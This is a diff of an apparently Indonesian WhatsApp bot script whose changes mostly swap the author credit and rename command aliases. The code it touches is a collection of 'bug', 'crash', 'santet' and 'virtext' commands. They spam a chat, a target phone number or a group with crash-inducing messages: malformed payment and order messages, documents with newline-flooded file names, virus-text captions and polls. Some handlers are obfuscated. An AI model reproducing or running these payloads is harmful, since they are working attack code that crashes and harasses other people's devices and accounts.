@@ -2,13 +2,13 @@
 // Buat Lu Yang Jual Sc Ini Yang Jujur Jangan Sampe Nipu 
    Apalagi Lari Dari Tanggung Jawab
 
-// Base © °rexju°Hw Mods : Copyan Dari Base Dika
+// Base © 𝐿𝑖𝑥𝑥𝑧𝑦Hw Mods : Copyan Dari Base Dika
 
-› Create By © °rexju°͢
-› Base Ori © °rexju°͢
+› Create By © 𝐿𝑖𝑥𝑥𝑧𝑦͢
+› Base Ori © 𝐿𝑖𝑥𝑥𝑧𝑦͢
 › Copyan Base Dika Hisoka Morou
 
-🌷 KALAU MAU RENAME TARO CREDITS GUA : © °rexju°*/
+🌷 KALAU MAU RENAME TARO CREDITS GUA : © 𝐿𝑖𝑥𝑥𝑧𝑦*/
 
 //=================================================//
 require('./hwkal')
@@ -136,7 +136,7 @@ const deploy = (teks) => {
   haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
 //=================================================//
 const reply = (teks) => {
-return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC © °rexju°͢`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: m })} 
+return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC © 𝐿𝑖𝑥𝑥𝑧𝑦͢`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/@user-pb3qt2ek1x`}}}, { quoted: m })} 
 //=================================================//
 try {
 let isNumber = x => typeof x === 'number' && !isNaN(x)
@@ -380,7 +380,7 @@ haikal.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.
 }
 }
 break
-case 'jadikatalog': case 'rexjukatalog': {
+case 'jadikatalog': case 'likjikatalog': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!quoted) throw 'Reply Image/sticker'
@@ -568,11 +568,11 @@ if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
 {
-haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC © °rexju°͢`,"body": `Selamat ${salam} kak ${pushname}`,
+haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC © 𝐿𝑖𝑥𝑥𝑧𝑦͢`,"body": `Selamat ${salam} kak ${pushname}`,
 mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${buttonkal}`,
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/c/HwModsWa857`,
-thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
+sourceUrl: `https://youtube.com/@user-pb3qt2ek1x`,
+thumbnailUrl: 'https://telegra.ph/file/dddb33d8ee583cd66b185.jpg', 
 }
 }}}}}, { quoted:doc})
 }
@@ -623,7 +623,7 @@ haikal.sendMessage(m.chat, buttonnnnmMessage)
 //=================================================//
 //=================================================//
 //=================================================//
-case 'inibug': case 'rexjujhon': {
+case 'inibug': case 'likjijhon': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -653,7 +653,7 @@ rows: [
 ]
 haikal.sendListMsg(m.chat, `🌷 HW MODS WA 🌷`, haikal.user.name, `Hay Kak Sc Bot Adia Di List`, `Click Here 🌷`, touchmebre, m)
 break
-case 'rexjupoll': case 'rexjujhon2': {
+case 'likjipoll': case 'likjijhon2': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -662,7 +662,7 @@ ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
 var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "pollCreationMessage": {
-"name": "HALO 👋 SAYA BOT © °rexju°͢",
+"name": "HALO 👋 SAYA BOT © 𝐿𝑖𝑥𝑥𝑧𝑦͢",
 "options": [
 {
 "optionName": "KATANYA WA KEBAL"
@@ -677,7 +677,7 @@ var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 "optionName": "KATANYA KEBAL"
 },
 {
-"optionName": "SALAM BROTHER BY © °rexju°͢"
+"optionName": "SALAM BROTHER BY © 𝐿𝑖𝑥𝑥𝑧𝑦͢"
 }
 ],
 "selectableOptionsCount": 5
@@ -688,7 +688,7 @@ deploy('sukses sendbug')}
 }
 break
 //=================================================//
-case 'rexjutroli2': case 'rexjutrol': case 'jutrol': {
+case 'likjitroli2': case 'likjitrol': case 'jutrol': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return reply(`Jumlahnya?`)
@@ -703,7 +703,7 @@ var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "itemCount": 1999,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"message": " BY © °rexju°",
+"message": " BY © 𝐿𝑖𝑥𝑥𝑧𝑦",
 "orderTitle": " BUG TROLI ", // 
 "sellerJid": "6283186308195@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
@@ -713,7 +713,7 @@ haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
 }
 }
 break
-case 'rexjutroli3': case 'rexjutrol2': {
+case 'likjitroli3': case 'likjitrol2': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return reply(`Jumlahnya?`)
@@ -724,7 +724,7 @@ function _0x4279(){const _0x4c3178=['fromObject','Message','1847261837216262824'
 }
 break
 //=================================================//
-case 'rexjusantet': {
+case 'likjisantet': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n`)
@@ -737,7 +737,7 @@ var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.from
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
-"text": `MY DEVELOPER © °rexju°͢`,
+"text": `MY DEVELOPER © 𝐿𝑖𝑥𝑥𝑧𝑦͢`,
 }
 }}), { userJid: m.chat, quoted: doc})
 haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -746,7 +746,7 @@ m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
 }
 break
 //=================================================//
-case 'rexjusantetgc': {
+case 'likjisantetgc': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
@@ -759,7 +759,7 @@ var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.from
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
-"text": `MY DEVELOPER © °rexju°͢`,
+"text": `MY DEVELOPER © 𝐿𝑖𝑥𝑥𝑧𝑦͢`,
 }
 }}), { userJid: m.chat, quoted: doc})
 haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -768,7 +768,7 @@ m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
 }
 break
 //=================================================//
-case 'ducu': case 'rexjuducu': {
+case 'ducu': case 'likjiducu': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -776,12 +776,12 @@ jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
 yy = fs.readFileSync('./baseikal/sound/hwmods.HW')
-haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`© °rexju°APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
+haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`© 𝐿𝑖𝑥𝑥𝑧𝑦APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
 }
 }
 break
 //=================================================//
-case 'rexjudaca': case 'rexjudaca':  {
+case 'likjidaca': case 'likjidaca':  {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -789,12 +789,12 @@ jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
  ilih = fs.readFileSync('./baseikal/sound/hwmods.HW')
- haikal.sendMessage(m.chat, {document: ilih, mimetype: '', fileName:`© °rexju°APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
+ haikal.sendMessage(m.chat, {document: ilih, mimetype: '', fileName:`© 𝐿𝑖𝑥𝑥𝑧𝑦APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
  }
  }
  break
 //=================================================//
-case 'rexjudocu': case 'rexjudraknes':  {
+case 'likjidocu': case 'likjidraknes':  {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -820,7 +820,7 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 }
 break
 //=================================================//
-case 'duc': case 'rexjuslebew': case 'cumadocu': {
+case 'duc': case 'likjislebew': case 'cumadocu': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -835,7 +835,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
 "pageCount": 0,
 "mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
-"fileName": `🔥 © °rexju°☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
+"fileName": `🔥 © 𝐿𝑖𝑥𝑥𝑧𝑦☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
 "fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
 "directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
 "mediaKeyTimestamp": "1659416157",
@@ -846,108 +846,108 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 }
 break
 //=================================================//
-case 'rexjuvirtext1': case 'rexjuzsu': case 'crashar1': {
+case 'likjivirtext1': case 'likjizsu': case 'crashar1': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °rexju°${iphone}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© 𝐿𝑖𝑥𝑥𝑧𝑦${iphone}` }, { quoted: doc })
 }
 }
 break
-case 'rexjuvirtext2': case 'rexjutol': case 'crashar2': {
+case 'likjivirtext2': case 'likjitol': case 'crashar2': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °rexju°${iphone1}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© 𝐿𝑖𝑥𝑥𝑧𝑦${iphone1}` }, { quoted: doc })
 }
 }
 break
-case 'rexjuvirtext3': case 'rexjumemek': case 'crashar3': {
+case 'likjivirtext3': case 'likjimemek': case 'crashar3': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °rexju°${iphone2}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© 𝐿𝑖𝑥𝑥𝑧𝑦${iphone2}` }, { quoted: doc })
 }
 }
 break
-case 'rexjuvirtext4': case 'rexjucontol': case 'crashar4': {
+case 'likjivirtext4': case 'likjicontol': case 'crashar4': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °rexju°${iphone3}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© 𝐿𝑖𝑥𝑥𝑧𝑦${iphone3}` }, { quoted: doc })
 }
 }
 break
-case 'rexjuvirtext5': case 'rexjutextv': case 'crashar5': {
+case 'likjivirtext5': case 'likjitextv': case 'crashar5': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °rexju°${iphone4}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© 𝐿𝑖𝑥𝑥𝑧𝑦${iphone4}` }, { quoted: doc })
 }
 }
 break
-case 'rexjuvirtext6': case 'rexjugas': case 'crashar6':{
+case 'likjivirtext6': case 'likjigas': case 'crashar6':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °rexju°${iphone5}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© 𝐿𝑖𝑥𝑥𝑧𝑦${iphone5}` }, { quoted: doc })
 }
 }
 break
-case 'rexjuvirtext7': case 'rexjuvirtext': {
+case 'likjivirtext7': case 'likjivirtext': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °rexju°${iphone6}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© 𝐿𝑖𝑥𝑥𝑧𝑦${iphone6}` }, { quoted: doc })
 }
 }
 break
-case 'rexjuvirtext8': case 'rexjuvirtext1': case 'crashar7':{
+case 'likjivirtext8': case 'likjivirtext1': case 'crashar7':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °rexju°${buttonkal}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© 𝐿𝑖𝑥𝑥𝑧𝑦${buttonkal}` }, { quoted: doc })
 }
 }
 break
-case 'rexjuvirtext9': case 'rexjuvirtext2': case 'crashar8':{
+case 'likjivirtext9': case 'likjivirtext2': case 'crashar8':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °rexju°${buttonvirus}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© 𝐿𝑖𝑥𝑥𝑧𝑦${buttonvirus}` }, { quoted: doc })
 }
 }
 break
-case 'rexjuvirtext10': case 'rexjuvirtext3': case 'crashar9': {
+case 'likjivirtext10': case 'likjivirtext3': case 'crashar9': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °rexju°${ngazap(prefix)}`}, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© 𝐿𝑖𝑥𝑥𝑧𝑦${ngazap(prefix)}`}, { quoted: doc })
 }
 }
 break
 //=================================================//
-case 'rexjubug1': case 'rexjucrash': case 'crashar10':{
+case 'likjibug1': case 'likjicrash': case 'crashar10':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -973,7 +973,7 @@ haikal.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
 }
 break
 //=================================================//
-case 'rexjubug2': case 'rexjucrash1': case 'crashar11': {
+case 'likjibug2': case 'likjicrash1': case 'crashar11': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -985,7 +985,7 @@ var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "imageMessage": {
 "url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc",
 "mimetype": "image/jpeg",
-"caption": `© © °rexju°͢${ngazap(prefix)}`,
+"caption": `© © 𝐿𝑖𝑥𝑥𝑧𝑦͢${ngazap(prefix)}`,
 "fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=",
 "fileLength": "42521",
 "height": 426,
@@ -1043,7 +1043,7 @@ templateButtons: [
  }
  break
 //=================================================//
-case 'rexjubug3': case 'rexjucrash2': case 'crashar12': {
+case 'likjibug3': case 'likjicrash2': case 'crashar12': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1059,7 +1059,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
 "pageCount": 0,
 "mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
-"fileName": `© © °rexju°͢${ngazap(prefix)}`,
+"fileName": `© © 𝐿𝑖𝑥𝑥𝑧𝑦͢${ngazap(prefix)}`,
 "fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
 "directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
 "mediaKeyTimestamp": "1657288637",
@@ -1070,7 +1070,7 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 }
 break
 //=================================================//
-case 'rexjubug4': case 'rexjucrash3': case 'crashar13':{
+case 'likjibug4': case 'likjicrash3': case 'crashar13':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1079,10 +1079,10 @@ ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
 var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "extendedTextMessage": {
-"text": `https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K\n\n© © °rexju°͢`,
+"text": `https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K\n\n© © 𝐿𝑖𝑥𝑥𝑧𝑦͢`,
 "matchedText": "https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K",
 "description": "Undangan Grup WhatsApp",
-"title": `© © °rexju°͢${ngazap(prefix)}`,
+"title": `© © 𝐿𝑖𝑥𝑥𝑧𝑦͢${ngazap(prefix)}`,
 "previewType": "NONE",
 }
 }), { userJid: m.chat, quoted: doc })
@@ -1091,7 +1091,7 @@ haikal.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
 }
 break
 //=================================================//
-case 'rexjubug5': case 'rexjucrash4': case 'crashar14': {
+case 'likjibug5': case 'likjicrash4': case 'crashar14': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1115,7 +1115,7 @@ haikal.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
 }
 }
 break
-case 'rexjubug6': case 'rexjucrash5': case 'crashar15':{
+case 'likjibug6': case 'likjicrash5': case 'crashar15':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1140,7 +1140,7 @@ haikal.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
 }
 break
 
-case 'rexjudelay': {
+case 'likjidelay': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1152,7 +1152,7 @@ var _0x39080c=_0x4b8f;function _0x3b16(){var _0x4c72fa=['chat','9940068BVkoHm','
 }
 break
 //=================================================//
-case 'rexjubug7': case 'rexjucrash6': case 'crashar16':{
+case 'likjibug7': case 'likjicrash6': case 'crashar16':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1164,8 +1164,8 @@ var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "extendedTextMessage": {
 "text": "https://wa.me/c/6285714170944",
 "matchedText": "https://wa.me/c/6285714170944",
-"description": "Developer © °rexju°͢\nWhatsApp / Script Bot \n\nORDER ? CHAT AJA 👋",
-"title": `© © °rexju°͢${ngazap(prefix)}`,
+"description": "Developer © 𝐿𝑖𝑥𝑥𝑧𝑦͢\nWhatsApp / Script Bot \n\nORDER ? CHAT AJA 👋",
+"title": `© © 𝐿𝑖𝑥𝑥𝑧𝑦͢${ngazap(prefix)}`,
 "previewType": "NONE",
 "jpegThumbnail": messa.imageMessage,
 }
@@ -1175,7 +1175,7 @@ haikal.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
 }
 break
 //=================================================//
-case 'rexjubug8': case 'rexjucrash7': case 'crashar17': {
+case 'likjibug8': case 'likjicrash7': case 'crashar17': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1184,8 +1184,8 @@ ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
 var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "contactMessage": {
-"displayName": `© © °rexju°͢${ngazap(prefix)}`,
